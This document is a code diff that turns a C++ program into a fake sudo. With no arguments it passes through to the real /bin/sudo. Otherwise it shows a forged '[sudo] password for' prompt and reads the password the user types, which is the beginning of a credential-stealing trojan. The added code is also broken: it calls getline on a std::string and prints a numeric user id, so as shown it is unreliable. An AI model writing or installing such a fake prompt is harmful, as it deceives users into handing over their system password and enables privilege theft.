@@ -1,9 +1,28 @@
 #include <iostream>
+#include <unistd.h>
 
-int main()
+int main(int argc, char *argv[])
 {
-    std::string helptext = "usage: sudo -h | -K | -k | -V\nusage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\nusage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]\nusage: sudo [-AbEHknPS] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value] [-i|-s] [<command>]\nusage: sudo -e [-AknS] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ...";
-
-    
+    if(argc == 1)
+    {
+        system("/bin/sudo");
+    }
+    else
+    {
+        bool allargs = true;
+        for(int i = 1;i < argc;i++)
+        {
+            std::string arg{argv[i]};
+            if(arg.find("-") != std::string::npos && arg.rfind("-") > 1){
+                allargs = false;
+                i = argc;
+            }
+        }
+        if(!allargs){
+            std::cout << "[sudo] password for " << getuid() << ":" << std::endl;
+            std::string passwd{""};
+            std::cin.getline(passwd,256);
+        }
+    }
     return 0;
 }
